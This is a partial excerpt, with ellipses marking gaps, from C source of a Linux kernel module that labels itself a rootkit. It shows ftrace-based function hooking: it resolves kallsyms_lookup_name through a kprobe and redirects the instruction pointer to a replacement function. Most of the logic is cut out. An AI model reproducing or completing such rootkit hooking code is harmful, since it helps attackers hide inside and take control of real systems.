...
static unsigned long (*fh_kallsyms_lookup_name)(const char *name);

static int fh_resolve_kallsyms_lookup_name(void)
{
    ...
    fh_kallsyms_lookup_name = (void *)kp.addr;
...
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    ...
    err = fh_resolve_kallsyms_lookup_name();
    if (err)
    {
        printk(KERN_DEBUG "rootkit: failed to resolve kallsyms_lookup_name: %d\n", err);
        return err;
    }
 ...
 *
 * Kernel ftrace callback signature changed in newer kernels:
 * - old: (.., struct pt_regs *regs)
 * - new: (.., struct ftrace_regs *regs)
 */
...
#if USE_FENTRY_OFFSET
    ftrace_regs_set_instruction_pointer(fregs, (unsigned long)hook->function);
#else
